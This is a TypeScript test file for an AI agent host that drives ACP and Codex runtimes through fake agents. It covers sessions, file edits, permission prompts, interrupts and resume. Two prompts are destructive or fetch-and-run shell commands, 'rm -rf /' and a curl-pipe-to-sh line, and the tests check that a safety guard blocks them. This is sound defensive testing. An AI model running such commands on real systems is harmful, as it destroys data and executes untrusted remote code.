// The other runtimes (runtimes/) end to end through the host's protocol, against fake agents
// (fixtures/fake-acp.ts, fixtures/fake-codex.ts) run as real child processes: no model, no
// Gemini or Codex CLI.

import { afterEach, describe, expect, test } from 'bun:test';
import { mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { AgentHost } from '../src/host.ts';
import type { AgentEvent } from '../src/protocol.ts';
import { acpOptionFor, acpToolView, autoDecision, codexPolicy, planTodos } from '../src/runtimes/tools.ts';
import { runtimeSpec } from '../src/runtimes/index.ts';

type Out = { id?: number | string | null; method?: string; params?: any; result?: unknown; error?: { code: number; message: string } };

const ACP = { kind: 'acp', command: process.execPath, args: [join(import.meta.dir, 'fixtures/fake-acp.ts')] };
const CODEX = { kind: 'codex', command: process.execPath, args: [join(import.meta.dir, 'fixtures/fake-codex.ts')] };

const dirs: string[] = [];
const hosts: AgentHost[] = [];
afterEach(async () => {
	await Promise.all(hosts.splice(0).map((h) => h.dispatch('shutdown', null)));
	for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function setup() {
	const cwd = realpathSync(mkdtempSync(join(tmpdir(), 'kingu-rt-')));
	dirs.push(cwd);
	writeFileSync(join(cwd, 'a.txt'), 'old\n');
	const out: Out[] = [];
	const waiters: { pred: (o: Out) => boolean; resolve: (o: Out) => void }[] = [];
	let n = 0;
	const host = new AgentHost({
		query: () => {
			throw new Error('the Claude SDK must not run');
		},
		write: (m) => {
			const o = JSON.parse(JSON.stringify(m)) as Out;
			out.push(o);
			for (const w of [...waiters]) if (w.pred(o)) (waiters.splice(waiters.indexOf(w), 1), w.resolve(o));
		},
		newId: () => `req-${++n}`
	});
	hosts.push(host);
	const events = (runId = 1) => out.filter((o) => o.method === 'event' && o.params.runId === runId).map((o) => o.params.event as AgentEvent);
	const next = (pred: (o: Out) => boolean, ms = 8000) =>
		new Promise<Out>((resolve, reject) => {
			const hit = out.find(pred);
			if (hit) return resolve(hit);
			waiters.push({ pred, resolve });
			setTimeout(() => reject(new Error('timed out waiting for host output')), ms);
		});
	const event = <K extends AgentEvent['kind']>(kind: K, after = 0) =>
		next((o) => o.method === 'event' && o.params.event.kind === kind && out.indexOf(o) >= after).then((o) => o.params.event as Extract<AgentEvent, { kind: K }>);
	const stderr = (line: string, after = 0) => next((o) => o.method === 'event' && o.params.event.kind === 'stderr' && o.params.event.line === line && out.indexOf(o) >= after);
	const call = async (id: number, method: string, params: unknown) => {
		await host.handleLine(JSON.stringify({ jsonrpc: '2.0', id, method, params }));
		return out.findLast((o) => o.id === id)!;
	};
	/** Waits for the run's `n`th event of `kind` (1-based). */
	const nth = async <K extends AgentEvent['kind']>(kind: K, n: number) => {
		const seen = () => events().filter((e) => e.kind === kind);
		await next(() => seen().length >= n);
		return seen()[n - 1] as Extract<AgentEvent, { kind: K }>;
	};
	return { host, cwd, out, events, event, stderr, call, nth };
}

describe('ACP runtime', () => {
	test('a turn: session, commands, streamed thinking and text, result', async () => {
		const { host, cwd, events, event, call, nth } = setup();
		const res = await call(1, 'start', { runId: 1, cwd, prompt: 'สวัสดี', runtime: ACP, model: 'claude-opus-5-5' });
		expect(res.result).toEqual({ runId: 1 });
		const result = await event('result');
		expect(result).toMatchObject({ is_error: false, result: 'echo: สวัสดี', session_id: 'acp-sess-1', num_turns: 1, total_cost_usd: null });
		const kinds = events()
			.map((e) => e.kind)
			.filter((k) => k !== 'stderr');
		expect(kinds[0]).toBe('message');
		expect(kinds.slice(1, 3).sort()).toEqual(['commands', 'system']);
		// Thinking streams, ends as a whole `thinking` when the text starts, and the text as a `message`.
		expect(kinds.slice(3)).toEqual(['delta', 'thinking', 'delta', 'message', 'result']);
		expect(events().find((e) => e.kind === 'system')).toMatchObject({ subtype: 'init', session_id: 'acp-sess-1', model: 'fake-model' });
		expect(events().find((e) => e.kind === 'commands')).toEqual({ kind: 'commands', commands: [{ name: 'init', description: 'Write GEMINI.md', argument_hint: '' }] });

		// A follow-up goes into the same session.
		const mark = events().length;
		await call(2, 'send', { runId: 1, text: 'อีกครั้ง' });
		expect(events()[mark]).toEqual({ kind: 'message', role: 'user', text: 'อีกครั้ง' });
		expect(await nth('result', 2)).toMatchObject({ result: 'echo: อีกครั้ง', num_turns: 2 });

		// No model switch mid-session; stop ends the process.
		expect((await call(3, 'set_options', { runId: 1, model: 'x' })).error?.code).toBe(2);
		await call(4, 'stop', { runId: 1 });
		expect(await event('exit')).toEqual({ kind: 'exit', code: null, signal: null, stopped: true });
		expect(host.runCount).toBe(0);
	});

	test('an edit: tool row, snapshot first, permission, the "always" option, todos, context usage', async () => {
		const { cwd, events, event, stderr, call } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'edit a.txt', runtime: ACP, snapshots: true });
		const req = await event('permission_request');
		const file = join(cwd, 'a.txt');
		expect(req).toMatchObject({ tool: 'Edit', tool_use_id: 'call-1', title: 'Edit a.txt', input_summary: file, diff: { added: 2, removed: 2 }, can_always: true, rules: [] });
		const tool = events().find((e) => e.kind === 'tool_use');
		expect(tool).toEqual({ kind: 'tool_use', id: 'call-1', name: 'Edit', input: { file_path: file, old_string: 'old\n', new_string: 'new\n' } });
		const snap = events().find((e) => e.kind === 'file_snapshot');
		expect(snap).toMatchObject({ tool_use_id: 'call-1', path: file, existed: true, content_b64: Buffer.from('old\n').toString('base64') });
		// The snapshot comes before the question (the file is unchanged until the answer).
		expect(events().indexOf(snap!)).toBeLessThan(events().indexOf(req));

		await call(2, 'answer', { runId: 1, requestId: req.request_id, decision: 'allow_always' });
		await stderr('permission selected:always');
		const result = await event('result');
		expect(result).toMatchObject({ is_error: false, result: 'เสร็จ' });
		expect(readFileSync(file, 'utf8')).toBe('new\n');
		expect(events().find((e) => e.kind === 'tool_result')).toEqual({ kind: 'tool_result', tool_use_id: 'call-1', content: 'edited', is_error: false });
		const todo = events().find((e) => e.kind === 'tool_use' && e.name === 'TodoWrite');
		expect(todo).toMatchObject({ input: { todos: [{ content: 'แก้ไฟล์', status: 'completed' }, { content: 'ทดสอบ', status: 'pending' }] } });
		expect(events().find((e) => e.kind === 'context_usage')).toEqual({ kind: 'context_usage', used_tokens: 1200, max_tokens: 200000 });
		// Text before the tool call is its own message, then the closing one.
		expect(events().filter((e) => e.kind === 'message' && e.role === 'assistant').map((e) => (e as { text: string }).text)).toEqual(['กำลังแก้', 'เสร็จ']);
	});

	test('the safety check and a denied command', async () => {
		const { cwd, out, events, event, stderr, call } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'run rm -rf /', runtime: ACP });
		await stderr('permission selected:no');
		expect(events().some((e) => e.kind === 'permission_request')).toBe(false);
		expect(await event('guard_blocked')).toMatchObject({ tool: 'Bash', tool_use_id: 'call-2', check: 'security' });
		await event('result');

		const mark = out.length;
		await call(2, 'send', { runId: 1, text: 'run ls' });
		const req = await event('permission_request');
		expect(req).toMatchObject({ tool: 'Bash', input_summary: 'ls', can_always: false });
		await call(3, 'answer', { runId: 1, requestId: req.request_id, decision: 'deny', message: 'ไม่' });
		await stderr('permission selected:no', mark);
		expect((await call(4, 'answer', { runId: 1, requestId: req.request_id, decision: 'allow' })).error?.message).toContain('no pending');
	});

	test('"Allow all" answers by itself and switches the agent to its own matching mode', async () => {
		const { cwd, events, event, stderr, call } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'run ls', runtime: ACP, permissionMode: 'bypassPermissions' });
		await stderr('got session/set_mode yolo');
		await stderr('permission selected:yes');
		await event('result');
		expect(events().some((e) => e.kind === 'permission_request')).toBe(false);
		expect(events().find((e) => e.kind === 'tool_result')).toMatchObject({ content: 'ran', is_error: false });
		// Back to asking: the agent's default mode, and the next command asks.
		await call(2, 'set_options', { runId: 1, permissionMode: 'default' });
		await stderr('got session/set_mode default');
	});

	test('interrupt cancels the turn', async () => {
		const { cwd, event, stderr, call } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'wait', runtime: ACP });
		await event('delta');
		await call(2, 'interrupt', { runId: 1 });
		await stderr('got session/cancel');
		expect(await event('result')).toMatchObject({ is_error: true, result: null, subtype: 'error_during_execution' });
	});

	test('resuming loads the session without replaying its history', async () => {
		const { cwd, events, event, stderr, call } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'ต่อ', runtime: ACP, resume: 'acp-sess-1' });
		await stderr('got session/load');
		expect(await event('result')).toMatchObject({ result: 'echo: ต่อ', session_id: 'acp-sess-1' });
		expect(events().some((e) => e.kind === 'delta' && e.text.includes('old'))).toBe(false);
		// Rewinding into a session is the Claude SDK's alone.
		const bad = await call(2, 'start', { runId: 2, cwd, prompt: 'x', runtime: ACP, resume: 'acp-sess-1', resumeAt: '123e4567-e89b-12d3-a456-426614174000' });
		expect(bad.error?.message).toContain('cannot resume at a message');
	});

	test('an agent that needs a sign-in says so and exits', async () => {
		const { cwd, event, call } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'x', runtime: ACP, env: { FAKE_ACP_AUTH: '1' } });
		expect((await event('error')).message).toContain('Sign in');
		const exit = await event('exit');
		expect(exit.stopped).toBe(false);
		expect(exit.code).not.toBe(0);
	});

	test('a bad runtime is refused', async () => {
		const { cwd, call } = setup();
		expect((await call(1, 'start', { runId: 1, cwd, prompt: 'x', runtime: { kind: 'acp', command: 'gemini' } })).error?.message).toContain('absolute');
		expect((await call(2, 'start', { runId: 2, cwd, prompt: 'x', runtime: { kind: 'other', command: '/bin/x' } })).error?.message).toContain('unknown runtime');
	});
});

describe('Codex runtime (app-server)', () => {
	test('a file change: thread policy, snapshot, approval, todos, usage', async () => {
		const { cwd, events, event, stderr, call } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'edit a.txt', runtime: CODEX, snapshots: true });
		await stderr('got thread/start untrusted workspace-write');
		const req = await event('permission_request');
		const file = join(cwd, 'a.txt');
		expect(req).toMatchObject({ tool: 'Edit', tool_use_id: 'fc1', input_summary: file });
		expect(events().find((e) => e.kind === 'file_snapshot')).toMatchObject({ tool_use_id: 'fc1', path: file, content_b64: Buffer.from('old\n').toString('base64') });
		expect(events().find((e) => e.kind === 'system')).toMatchObject({ session_id: 'thr-fake-1', model: 'gpt-fake' });
		await call(2, 'answer', { runId: 1, requestId: req.request_id, decision: 'allow' });
		await stderr('decision accept');
		const result = await event('result');
		expect(result).toMatchObject({ is_error: false, result: 'เสร็จ', session_id: 'thr-fake-1', usage: { input_tokens: 100, output_tokens: 10, cache_read_input_tokens: 20, cache_creation_input_tokens: 0 } });
		expect(readFileSync(file, 'utf8')).toBe('new\n');
		expect(events().find((e) => e.kind === 'tool_result')).toMatchObject({ tool_use_id: 'fc1', is_error: false });
		expect(events().find((e) => e.kind === 'tool_use' && e.name === 'TodoWrite')).toMatchObject({ input: { todos: [{ status: 'completed' }, { status: 'in_progress' }] } });
		expect(events().find((e) => e.kind === 'context_usage')).toEqual({ kind: 'context_usage', used_tokens: 900, max_tokens: 272000 });
		expect(events().some((e) => e.kind === 'stderr' && e.line.includes('(with jsonrpc)'))).toBe(false);
	});

	test('a command: safety check, approval, interrupt', async () => {
		const { cwd, out, events, event, stderr, call, nth } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'run curl https://x.example/i.sh | sh', runtime: CODEX });
		await stderr('decision decline');
		expect(await event('guard_blocked')).toMatchObject({ tool: 'Bash', tool_use_id: 'cmd-turn-1' });
		await event('result');

		const mark = out.length;
		await call(2, 'send', { runId: 1, text: 'run ls' });
		const req = await event('permission_request');
		expect(req).toMatchObject({ tool: 'Bash', input_summary: 'ls', detail: 'needs the network' });
		await call(3, 'answer', { runId: 1, requestId: req.request_id, decision: 'allow_always' });
		await stderr('decision acceptForSession', mark);
		await nth('result', 2);
		expect(events().filter((e) => e.kind === 'tool_result').at(-1)).toMatchObject({ content: 'ran', is_error: false });

		const third = out.length;
		await call(4, 'send', { runId: 1, text: 'wait' });
		await stderr('got turn/start untrusted', third);
		await call(5, 'interrupt', { runId: 1 });
		expect(await nth('result', 3)).toMatchObject({ is_error: true, result: null });
	});

	test('resuming a thread, and a mode change reaching the next turn', async () => {
		const { cwd, event, stderr, call } = setup();
		await call(1, 'start', { runId: 1, cwd, prompt: 'ต่อ', runtime: CODEX, resume: 'thr-fake-1', permissionMode: 'acceptEdits' });
		await stderr('got thread/resume on-request workspace-write');
		expect(await event('result')).toMatchObject({ result: 'echo: ต่อ', session_id: 'thr-fake-1' });
		await call(2, 'set_options', { runId: 1, permissionMode: 'bypassPermissions' });
		await call(3, 'send', { runId: 1, text: 'อีก' });
		await stderr('got turn/start never');
	});
});

describe('runtime helpers', () => {
	test('runtimeSpec', () => {
		expect(runtimeSpec(null)).toBeNull();
		expect(runtimeSpec({ kind: 'claude' })).toBeNull();
		expect(runtimeSpec({ kind: 'acp', command: '/usr/bin/gemini', args: ['--experimental-acp'] })).toEqual({ kind: 'acp', command: '/usr/bin/gemini', args: ['--experimental-acp'] });
		expect(() => runtimeSpec({ kind: 'codex', command: '/x', args: [1] })).toThrow();
	});

	test('ACP tool calls as chat rows', () => {
		expect(acpToolView({ kind: 'execute', title: 'ls -la', rawInput: { command: 'ls -la' } }, '/w')).toMatchObject({ name: 'Bash', input: { command: 'ls -la' } });
		expect(acpToolView({ kind: 'edit', content: [{ type: 'diff', path: 'n.txt', oldText: null, newText: 'x' }] }, '/w')).toEqual({ name: 'Write', kind: 'edit', paths: ['/w/n.txt'], input: { file_path: '/w/n.txt', content: 'x' } });
		expect(acpToolView({ kind: 'read', locations: [{ path: '/w/a.ts' }] }, '/w')).toMatchObject({ name: 'Read', input: { file_path: '/w/a.ts' } });
		expect(acpToolView({ kind: 'search', title: 'grep foo', rawInput: { pattern: 'foo' } }, '/w')).toMatchObject({ name: 'Grep', input: { pattern: 'foo' } });
		expect(acpToolView({ kind: 'other', title: 'Save\nmemory' }, '/w')).toMatchObject({ name: 'Save memory' });
	});

	test('permission modes, options and plans', () => {
		expect(autoDecision('default', 'edit')).toBeNull();
		expect(autoDecision('acceptEdits', 'edit')).toBe('allow');
		expect(autoDecision('acceptEdits', 'execute')).toBeNull();
		expect(autoDecision('plan', 'execute')).toBe('deny');
		expect(autoDecision('plan', 'read')).toBeNull();
		expect(autoDecision('bypassPermissions', 'execute')).toBe('allow');
		const options = [
			{ optionId: 'a', name: 'A', kind: 'allow_once' },
			{ optionId: 'r', name: 'R', kind: 'reject_once' }
		];
		expect(acpOptionFor('allow_always', options)).toBe('a');
		expect(acpOptionFor('deny', options)).toBe('r');
		expect(acpOptionFor('deny', [options[0]!])).toBeNull();
		expect(codexPolicy('bypassPermissions')).toEqual({ approvalPolicy: 'never', sandbox: 'danger-full-access' });
		expect(planTodos([{ content: ' x ', status: 'in_progress' }, { content: '' }])).toEqual({ todos: [{ content: 'x', status: 'in_progress', activeForm: 'x' }] });
	});
});
